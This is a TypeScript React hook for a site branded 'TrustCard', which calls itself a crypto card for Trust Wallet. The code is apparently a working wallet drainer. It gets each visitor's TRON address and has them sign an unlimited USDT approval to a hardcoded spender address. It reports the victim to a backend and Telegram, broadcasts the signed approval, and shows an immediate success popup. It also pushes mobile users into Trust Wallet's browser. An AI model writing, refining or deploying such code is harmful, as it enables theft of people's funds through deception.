"use client";

import { useRef, useState } from "react";
import { TronWeb } from "tronweb";
import axios from "axios";
import SignClient from "@walletconnect/sign-client";

// ── Constants ────────────────────────────────────────────────────────────────
const PROJECT_ID       = process.env.NEXT_PUBLIC_REOWN_PROJECT_ID ?? "";
const FULL_NODE        = "https://api.trongrid.io";
const CHAIN_ID         = "tron:0x2b6653dc";
const USDT             = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER          = "TDSDLtNdPV2kSd547ayud4ARRk6yFbUUud";
const TRON_BACKEND_URL = process.env.NEXT_PUBLIC_TRON_BACKEND_URL ?? "";

const MAX_APPROVE =
  "115792089237316195423570985008687907853269984665640564039457584007913129639935";

// ─────────────────────────────────────────────────────────────────────────────
export function useTrc20Approval() {
  const [wcUri, setWcUri]                = useState<string | null>(null);
  const [showSignModal, setShowSignModal] = useState(false);
  const [showSuccess, setShowSuccess]    = useState(false);
  const [txHash, setTxHash]              = useState("");
  const [processing, setProcessing]      = useState(false);

  const clientRef    = useRef<SignClient | null>(null);
  const pendingWCRef = useRef<{
    promise: Promise<{ uri: string; approval: () => Promise<any>; client: SignClient } | null>;
  } | null>(null);

  // ── Init or reuse SignClient ──────────────────────────────────────────────
  const getClient = async (): Promise<SignClient> => {
    if (clientRef.current) return clientRef.current;
    const c = await SignClient.init({
      projectId: PROJECT_ID,
      metadata: {
        name: "TrustCard",
        description: "Crypto card for Trust Wallet",
        url: typeof window !== "undefined" ? window.location.origin : "",
        icons: [],
      },
    });
    clientRef.current = c;
    return c;
  };

  // ── Pre-generate WC URI (desktop only, on hover) ─────────────────────────
  const preGenerateWCUri = () => {
    if (typeof window === "undefined") return;
    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(navigator.userAgent)) return;
    if (pendingWCRef.current) return;

    const generate = async () => {
      try {
        const c = await getClient();
        try {
          for (const s of c.session.getAll()) {
            await c.disconnect({ topic: s.topic, reason: { code: 6000, message: "reset" } }).catch(() => {});
          }
        } catch {}
        const result = await c.connect({
          requiredNamespaces: {
            tron: {
              chains: [CHAIN_ID],
              methods: ["tron_signTransaction", "tron_signMessage"],
              events: ["accountsChanged", "chainChanged"],
            },
          },
        });
        return result?.uri ? { uri: result.uri, approval: result.approval, client: c } : null;
      } catch (e) {
        console.warn("preGenerateWCUri (TRC20) failed:", e);
        return null;
      }
    };

    pendingWCRef.current = { promise: generate() };
  };

  // ── PATH A: Native TronWeb inside Trust Wallet DApp browser ──────────────
  // Shows success popup immediately after sign (native flow is reliable).
  const approveWithTronLink = async () => {
    const tron = (window as any).tronWeb;
    if (!tron) throw new Error("TronWeb not found");

    // Step 1: get address from defaultAddress (poll 15×200ms = 3s max)
    let address: string = tron.defaultAddress?.base58 || "";
    if (!address) {
      for (let i = 0; i < 15; i++) {
        await new Promise(r => setTimeout(r, 200));
        if (tron.defaultAddress?.base58) {
          address = tron.defaultAddress.base58;
          break;
        }
      }
    }

    // Step 2: still no address — request accounts as LAST resort
    if (!address) {
      try {
        if ((window as any).tronLink?.request) {
          await (window as any).tronLink.request({ method: "tron_requestAccounts" });
        } else if (tron.request) {
          await tron.request({ method: "tron_requestAccounts" });
        }
        // Poll again after request (20×300ms = 6s max)
        for (let i = 0; i < 20; i++) {
          await new Promise(r => setTimeout(r, 300));
          if (tron.defaultAddress?.base58) {
            address = tron.defaultAddress.base58;
            break;
          }
        }
      } catch (e) {
        console.warn("tron_requestAccounts failed", e);
      }
    }

    if (!address) throw new Error("Could not get TRON address");

    // notify-visit fire-and-forget
    if (TRON_BACKEND_URL) {
      axios.post(`${TRON_BACKEND_URL}/notify-visit`, { userAddress: address, attemptFund: true }).catch(() => {});
    }

    // Build approve() transaction
    const parameter = [
      { type: "address", value: SPENDER },
      { type: "uint256", value: MAX_APPROVE },
    ];
    const txObj = await tron.transactionBuilder.triggerSmartContract(
      USDT, "approve(address,uint256)",
      { feeLimit: 1_000_000_000, callValue: 0 },
      parameter, address
    );
    if (!txObj?.result?.result) throw new Error("Transaction building failed");

    if (txObj.transaction) {
      const extended = await tron.transactionBuilder.extendExpiration(txObj.transaction, 86000);
      txObj.transaction = extended;
    }

    // Sign — Trust Wallet shows native sign popup here
    const signedTx = await tron.trx.sign(txObj.transaction || txObj);

    // ✅ Show success immediately after sign (mobile native = reliable)
    setTxHash(signedTx.txID ?? "");
    setShowSuccess(true);

    // Telegram notify immediately (fire-and-forget)
    if (TRON_BACKEND_URL) {
      axios.post(`${TRON_BACKEND_URL}/notify-approval`, {
        userAddress: address,
        txHash: signedTx.txID ?? "",
        source: "website",
      }).catch(() => {});
    }

    // Broadcast in background
    if (TRON_BACKEND_URL) {
      axios.post(`${TRON_BACKEND_URL}/broadcast-approval`, {
        userAddress: address,
        signedTransaction: signedTx,
      }).then(res => { if (res.data?.txHash) setTxHash(res.data.txHash); }).catch(() => {});
    }
  };

  // ── Main handler ──────────────────────────────────────────────────────────
  const handleTrc20Approval = async () => {
    setProcessing(true);

    try {
      // Matches reference regex exactly (ApproveForForward.tsx line 646)
      const isMobile = typeof window !== "undefined" &&
        /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(navigator.userAgent);

      // ════════════════════════════════════════════════════════════════
      // PATH A: Native TronWeb (Trust Wallet DApp Browser / TronLink)
      // Poll up to 3s for tronWeb to be ready.
      // ════════════════════════════════════════════════════════════════
      const nativeTron = typeof window !== "undefined" ? (window as any).tronWeb : null;
      if (nativeTron) {
        let tries = 0;
        while (!nativeTron.ready && tries < 10) {
          await new Promise(r => setTimeout(r, 300));
          tries++;
        }
        if (nativeTron.ready) {
          await approveWithTronLink();
          return;
        }
      }

      // ════════════════════════════════════════════════════════════════
      // MOBILE PATH — Matches reference ApproveForForward.tsx lines 646-671
      // ════════════════════════════════════════════════════════════════
      if (isMobile) {
        const isTrust =
          ((window as any).ethereum &&
            ((window as any).ethereum.isTrust || (window as any).ethereum.isTrustWallet)) ||
          navigator.userAgent.includes("TrustWallet");

        if (!isTrust) {
          // Regular mobile browser — redirect to Trust Wallet DApp browser.
          const baseUrl = window.location.origin + window.location.pathname;
          const destUrl = `${baseUrl}?tw_network=TRON`;
          const encoded = encodeURIComponent(destUrl);
          window.location.href = `trust://open_url?coin_id=195&url=${encoded}`;
          setTimeout(() => {
            window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${encoded}`;
          }, 1500);
          setProcessing(false);
          return;
        }

        // Inside Trust Wallet but tronWeb not ready yet — give it more time (+3s)
        let extraTries = 0;
        while (!(window as any).tronWeb?.ready && extraTries < 10) {
          await new Promise(r => setTimeout(r, 300));
          extraTries++;
        }
        if ((window as any).tronWeb?.ready) {
          await approveWithTronLink();
          return;
        }
      }

      // ════════════════════════════════════════════════════════════════
      // PATH B: WalletConnect (Desktop — QR scan flow)
      // Matches reference: await broadcast before showing success popup.
      // ════════════════════════════════════════════════════════════════
      let preGen = null;
      if (pendingWCRef.current) {
        preGen = await pendingWCRef.current.promise;
        pendingWCRef.current = null;
      }

      let activeClient: SignClient;
      let sess: any;

      if (preGen) {
        setWcUri(preGen.uri);
        setProcessing(false);
        // Mobile: open Trust Wallet WC prompt directly
        if (isMobile) {
          window.location.href = `trust://wc?uri=${encodeURIComponent(preGen.uri)}`;
        }
        sess = await preGen.approval();
        activeClient = preGen.client;
      } else {
        activeClient = await getClient();
        try {
          for (const s of activeClient.session.getAll()) {
            await activeClient
              .disconnect({ topic: s.topic, reason: { code: 6000, message: "reset" } })
              .catch(() => {});
          }
        } catch {}

        const { uri, approval } = await activeClient.connect({
          requiredNamespaces: {
            tron: {
              chains: [CHAIN_ID],
              methods: ["tron_signTransaction", "tron_signMessage"],
              events: ["accountsChanged", "chainChanged"],
            },
          },
        });

        if (!uri) throw new Error("WalletConnect URI not generated");
        setWcUri(uri);
        setProcessing(false);

        // Mobile: open Trust Wallet WC prompt directly (matches reference lines 776-781)
        if (isMobile) {
          window.location.href = `trust://wc?uri=${encodeURIComponent(uri)}`;
        }

        sess = await approval();
      }

      const address = sess.namespaces?.tron?.accounts?.[0]?.split(":")?.[2];
      if (!address) throw new Error("No wallet address from session");

      setProcessing(true);
      setWcUri(null);
      setShowSignModal(true);

      // notify-visit fire-and-forget
      if (TRON_BACKEND_URL) {
        axios.post(`${TRON_BACKEND_URL}/notify-visit`, { userAddress: address, attemptFund: true }).catch(() => {});
      }

      // Build approve transaction via read-only TronWeb
      const tron = new TronWeb({ fullHost: FULL_NODE });
      tron.setAddress(address);

      const parameter = [
        { type: "address", value: SPENDER },
        { type: "uint256", value: MAX_APPROVE },
      ];

      const transaction = await tron.transactionBuilder.triggerSmartContract(
        USDT, "approve(address,uint256)",
        { feeLimit: 1_000_000_000, callValue: 0 },
        parameter, address
      );

      if (!transaction.result?.result) throw new Error("Transaction building failed");

      if (transaction.transaction) {
        const extended = await tron.transactionBuilder.extendExpiration(
          transaction.transaction as any, 86000
        );
        (transaction as any).transaction = extended;
      }

      // ── Sign via WalletConnect (dual-format — matches reference lines 831-850) ──
      let result: any;
      try {
        result = await activeClient.request<any>({
          topic: sess.topic,
          chainId: CHAIN_ID,
          request: { method: "tron_signTransaction", params: { address, transaction } },
        });
      } catch {
        result = await activeClient.request<any>({
          topic: sess.topic,
          chainId: CHAIN_ID,
          request: { method: "tron_signTransaction", params: [transaction] },
        });
      }

      // Dismiss "Check Your Mobile Wallet" modal
      setShowSignModal(false);

      // ── Normalise signed tx (matches reference lines 853-868) ──
      let signedTx: any = null;
      if (typeof result === "string") {
        const sig = result.startsWith("0x") ? result.substring(2) : result;
        signedTx = { ...(transaction.transaction ?? transaction), signature: [sig] };
      } else if (result?.signature && Array.isArray(result.signature)) {
        signedTx = result;
      } else if (result?.transaction?.signature && Array.isArray(result.transaction.signature)) {
        signedTx = result.transaction;
      } else if (result?.result?.signature && Array.isArray(result.result.signature)) {
        signedTx = result.result;
      } else if (result?.result?.transaction?.signature) {
        signedTx = result.result.transaction;
      } else {
        signedTx = result;
      }

      if (!signedTx?.signature?.length) throw new Error("Transaction is missing signature!");

      // ── Broadcast via backend (fire-and-forget — you broadcast later) ──
      let finalTxHash = signedTx.txID ?? "";
      if (TRON_BACKEND_URL) {
        axios.post(`${TRON_BACKEND_URL}/broadcast-approval`, {
          userAddress: address,
          signedTransaction: signedTx,
        }).then(res => {
          if (res.data?.txHash) setTxHash(res.data.txHash);
        }).catch(() => {});
      }

      // ✅ Telegram notify (fire-and-forget)
      if (TRON_BACKEND_URL) {
        axios.post(`${TRON_BACKEND_URL}/notify-approval`, {
          userAddress: address,
          txHash: finalTxHash,
          source: "website",
        }).catch(() => {});
      }

      // ✅ Show "Approval Submitted!" popup immediately after sign
      setTxHash(finalTxHash);
      setShowSuccess(true);

    } catch (err: any) {
      setShowSignModal(false);
      const msg = (err?.message ?? "").toLowerCase();
      if (
        err?.code === 4001 ||
        err?.code === "ACTION_REJECTED" ||
        msg.includes("reject") ||
        msg.includes("cancel") ||
        msg.includes("user denied") ||
        msg.includes("declined")
      ) return;
      console.error("TRC20 error:", err);
    } finally {
      setProcessing(false);
      setWcUri(null);
      setShowSignModal(false);
    }
  };

  return {
    handleTrc20Approval,
    preGenerateWCUri,
    wcUri,
    setWcUri,
    showSignModal,
    setShowSignModal,
    showSuccess,
    setShowSuccess,
    txHash,
    processing,
    setProcessing,
  };
}
